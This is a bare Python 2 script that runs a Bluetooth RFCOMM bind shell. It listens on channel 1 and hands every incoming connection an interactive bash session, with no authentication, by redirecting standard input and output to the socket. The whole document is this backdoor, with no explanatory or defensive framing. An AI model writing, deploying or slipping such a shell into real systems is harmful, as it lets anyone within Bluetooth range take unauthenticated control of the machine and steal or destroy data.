from bluetooth import *
import os
import subprocess
import thread

def client_t(s):
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call( ["bash", "-i"] )

port = 1

server = BluetoothSocket( RFCOMM )
server.bind( ("", port) )
server.listen(1)

while True:
    conn,addr = server.accept()
    print "[*] Connection from ", addr

    thread.start_new_thread(client_t, (conn,))

server.close()
